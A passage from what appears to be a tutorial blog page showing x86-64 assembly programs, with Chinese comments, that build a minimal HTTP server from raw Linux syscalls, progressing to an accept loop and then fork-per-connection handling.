class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]       # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512             # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]     # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi             # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0    # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2               # syscall: open</span><br><span class="line">    mov rdi, rdi             # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi             # O_RDONLY</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax            # 测试返回值以检查错误</span><br><span class="line">    js exit_failure          # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax             # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax             # 保存文件描述符</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区</span><br><span class="line">    mov rdx, 1024            # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12             # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]      # 响应内容的位置</span><br><span class="line">    mov rdx, 19              # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15             # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3               # syscall: close</span><br><span class="line">    mov rdi, rbx             # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp exit_success         # 跳转到成功退出</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区l</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><a href="#1-7-Program-that-dynamically-responds-to-multiple-HTTP-GET-requests" class="headerlink" title="1.7 Program that dynamically responds to multiple HTTP GET requests"></a>1.7 Program that dynamically responds to multiple HTTP GET requests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">		# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">		# bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            				# 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  				# sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line">		</span><br><span class="line">		# listen(3, 0) = 0</span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">accept_loop:</span><br><span class="line">		# accept(3, NULL, NULL) = 4</span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">		# read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]       # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512             # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]     # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi             # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0    # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">		# open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2               # syscall: open</span><br><span class="line">    mov rdi, rdi             # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi             # O_RDONLY: 0</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax            # 测试返回值以检查错误</span><br><span class="line">    js exit_failure          # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax             # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax             # 保存文件描述符</span><br><span class="line">    mov rax, 0               # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区</span><br><span class="line">    mov rdx, 1024            # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12             # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]      # 响应内容的位置</span><br><span class="line">    mov rdx, 19              # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1               # syscall: write</span><br><span class="line">    mov rdi, rbx             # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]      # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15             # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3               # syscall: close</span><br><span class="line">    mov rdi, rbx             # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp accept_loop          # 跳转到接受新的连接</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">exit_success:</span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512              # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests"><a href="#1-9-Multi-processed-program-that-dynamically-responds-to-multiple-HTTP-GET-requests" class="headerlink" title="1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests"></a>1.9 Multi-processed program that dynamically responds to multiple HTTP GET requests</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    # socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">    # 创建套接字，AF_INET = 2, SOCK_STREAM = 1, IPPROTO_IP = 0</span><br><span class="line">    mov rax, 41            # syscall: socketcall (socket)</span><br><span class="line">    mov rdi, 2             # AF_INET</span><br><span class="line">    mov rsi, 1             # SOCK_STREAM</span><br><span class="line">    mov rdx, 0             # IPPROTO_IP</span><br><span class="line">    syscall</span><br><span class="line">    # 存储套接字描述符，应为3</span><br><span class="line">    mov rdi, rax           # 保存套接字描述符，rax 执行syscall 后保存 函数返回值</span><br><span class="line"></span><br><span class="line">    # bind(3, &#123;sa_family=AF_INET, sin_port=htons(80), sin_addr=inet_addr(&quot;0.0.0.0&quot;)&#125;, 16) = 0</span><br><span class="line">    # 准备bind的系统调用</span><br><span class="line">    # 准备 socketaddr_in</span><br><span class="line">    sub rsp, 16            # 分配16字节的空间用于sockaddr_in结构</span><br><span class="line">    mov word ptr [rsp], 2  # sa_family = AF_INET</span><br><span class="line">    mov word ptr [rsp+2], 0x5000  # 端口号80 (htons(80))</span><br><span class="line">    mov dword ptr [rsp+4], 0      # 地址 0.0.0.0 (INADDR_ANY)</span><br><span class="line"></span><br><span class="line">    # bind函数调用</span><br><span class="line">    mov rax, 49            # syscall: bind</span><br><span class="line">    mov rsi, rsp           # 第二个参数指向sockaddr_in结构</span><br><span class="line">    mov rdx, 16            # 第三个参数为sockaddr_in结构的大小</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # listen(3, 0) = 0</span><br><span class="line">    # listening 函数调用</span><br><span class="line">    mov rax, 50            # syscall: listen</span><br><span class="line">    mov rsi, 0             # backlog = 0, 允许的挂起连接数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">accept_loop:</span><br><span class="line">    # accept(3, NULL, NULL) = 4</span><br><span class="line">    # accept 函数调用</span><br><span class="line">    mov rax, 43</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax           # 保存接受连接的套接字描述符</span><br><span class="line"></span><br><span class="line">    # fork 函数调用</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax          # 测试返回值</span><br><span class="line">    js exit_failure        # 如果fork失败则退出</span><br><span class="line">    jz child_process       # 如果是子进程则跳转</span><br><span class="line"></span><br><span class="line">    # 父进程</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, rbx           # 关闭已接受的连接</span><br><span class="line">    syscall</span><br><span class="line">    jmp accept_loop        # 跳转到接受新的连接</span><br><span class="line"></span><br><span class="line">child_process:</span><br><span class="line">    # 关闭监听套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, 3             # 关闭监听套接字</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">    # read 读取数据</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-512]     # &lt;read_request&gt; 指向缓冲区，预留空间</span><br><span class="line">    mov rdx, 512           # &lt;read_request_count&gt; 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 提取路径</span><br><span class="line">    lea rdi, [rsp-512+4]   # 跳过 &quot;GET &quot; 到路径起始处</span><br><span class="line">    mov rcx, rdi           # 复制地址到rcx，用于查找路径结束</span><br><span class="line"></span><br><span class="line">find_end_of_path:</span><br><span class="line">    cmp byte ptr [rcx], 0x20 # 比较空格字符 (ASCII 32)</span><br><span class="line">    je end_of_path_found</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp find_end_of_path</span><br><span class="line"></span><br><span class="line">end_of_path_found:</span><br><span class="line">    mov byte ptr [rcx], 0  # 在路径结尾放置null字符终止路径字符串</span><br><span class="line"></span><br><span class="line">    # open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 5</span><br><span class="line">    # 打开文件</span><br><span class="line">    mov rax, 2             # syscall: open</span><br><span class="line">    mov rdi, rdi           # rdi 已经包含路径的起始地址</span><br><span class="line">    xor rsi, rsi           # O_RDONLY: 0</span><br><span class="line">    syscall</span><br><span class="line">    test rax, rax          # 测试返回值以检查错误</span><br><span class="line">    js exit_failure        # 如果返回值为负，跳转到错误处理</span><br><span class="line"></span><br><span class="line">    # 成功打开文件</span><br><span class="line">    mov r12, rax           # 保存文件描述符</span><br><span class="line"></span><br><span class="line">    # 读取文件 read(5, &lt;read_file&gt; at [rsp - 1024], &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">    mov rdi, rax           # 保存文件描述符</span><br><span class="line">    mov rax, 0             # syscall: read</span><br><span class="line">    lea rsi, [rsp-1024]    # 指向缓冲区</span><br><span class="line">    mov rdx, 1024          # 读取的最大字节数</span><br><span class="line">    syscall</span><br><span class="line">    # 成功读取文件，返回读取到的字节数</span><br><span class="line">    mov r15, rax</span><br><span class="line"></span><br><span class="line">    # close(5) = 0</span><br><span class="line">    mov rax, 3</span><br><span class="line">    mov rdi, r12           # 使用正确的文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">    # write 发送HTTP响应</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [response]    # 响应内容的位置</span><br><span class="line">    mov rdx, 19            # 响应内容长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">    # write 发送读取到的文件内容</span><br><span class="line">    mov rax, 1             # syscall: write</span><br><span class="line">    mov rdi, rbx           # 使用接受的套接字描述符</span><br><span class="line">    lea rsi, [rsp-1024]    # 指向缓冲区 write_file</span><br><span class="line">    mov rdx, r15           # 写入的长度</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 关闭接受连接的套接字</span><br><span class="line">    mov rax, 3             # syscall: close</span><br><span class="line">    mov rdi, rbx           # 文件描述符</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 正常退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    xor rdi, rdi           # exit status 0</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    # 标签定义</span><br><span class="line">exit_failure:</span><br><span class="line">    # 失败退出</span><br><span class="line">    mov rax, 60            # syscall: exit</span><br><span class="line">    mov rdi, 1             # exit status 1</span><br><span class="line">    syscall                # 执行退出</span><br><span class="line">    ret                    # 从程序返回</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">response:</span><br><span class="line">    .ascii &quot;HTTP/1.0 200 OK\r\n\r\n&quot;</span><br><span class="line"></span><br><span class="line">.section .bss</span><br><span class="line">    .space 512             # 分配512字节的缓冲区</span><br><span class="line"></span><br></pre></td></tr></table></figure>

